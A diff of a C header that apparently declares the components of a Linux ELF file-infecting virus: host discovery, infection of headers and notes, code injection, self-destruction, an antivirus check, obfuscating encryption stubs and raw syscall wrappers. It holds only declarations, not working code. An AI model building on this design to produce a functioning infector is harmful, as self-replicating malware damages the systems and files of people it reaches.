@@ -33,11 +33,9 @@
 #define LEFT 0
 #define RIGHT 1
 
-#define PAYLOAD_SIZE (size_t)((void *)out - (void *)__entry)
-
-#define STACK_SIZE 1024 * 64
-
 #define BUFF_SIZE 8192
+
+#define JMP_SIZE 5
 
 ////////////////////////////////////////////////////////////////////////////////
 /// ENUMS
@@ -65,7 +63,7 @@ struct linux_dirent64
 struct s_directory
 {
 	char path[PATH_MAX];
-	size_t entry;
+	ssize_t entry;
 };
 
 struct s_note
@@ -106,11 +104,11 @@ struct s_keychain
 /// DECLARATIONS 
 ////////////////////////////////////////////////////////////////////////////////
 
-void out(void);
-
 // LINEAR FLOW 
 void __entry(void);
 
+void antivirus(struct s_host *host, struct s_keychain *keychain, enum e_context context);
+void init(struct s_host *host, struct s_keychain *keychain, enum e_context context);
 void find_host(struct s_host *host, struct s_keychain *keychain, void *dir, const size_t size, enum e_context context);
 void host_constructor(struct s_host *host, struct s_keychain *keychain, const char *filename, enum e_context context);
 void criteria(struct s_host *host, struct s_keychain *keychain, enum e_context context);
@@ -119,13 +117,31 @@ void note_infection(struct s_host *host, struct s_keychain *keychain, enum e_con
 void header_infection(struct s_host *host, struct s_keychain *keychain, enum e_context context);
 void injection(struct s_host *host, struct s_keychain *keychain, enum e_context context);
 void autodestruction(struct s_host *host, struct s_keychain *keychain, enum e_context context);
+void execution(const struct s_host *host, struct s_keychain *keychain);
 
-void __exit(const struct s_host *host, struct s_keychain *keychain);
+void __exit(void);
 
 // STUB (OBFUSCATION)
 __attribute__((hot)) void update_keychain_left(struct s_keychain *keychain, const char *caller, const size_t size);
 __attribute__((hot)) void update_keychain_right(struct s_keychain *keychain, const char *caller, const size_t size);
 __attribute__((hot)) void decrypt_left(const struct s_keychain *keychain, char *callee, const size_t size);
 __attribute__((hot)) void decrypt_right(const struct s_keychain *keychain, char *callee, const size_t size);
+
+// SYSCALL
+uid_t _getuid(void);
+int _open(const char *pathname, int flags, mode_t mode);
+int _close(int fd);
+int _getdents64(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count);
+ssize_t _getrandom(void *buf, size_t buflen, unsigned int flags);
+int _stat(const char *filename, struct stat *statbuf);
+void *_mmap(void *addr, size_t length, int prot, int flags, int fd, off_t offset);
+ssize_t _write(int fd, const void *buf, size_t count);
+int _munmap(void *addr, size_t length);
+
+// TOOLS
+size_t _strlen(const char *str);
+void _bzero(char *str, const size_t size);
+size_t _get_random_integer(const size_t range);
+void _memcpy(void *dst, void const *src, const size_t size);
 
 #endif
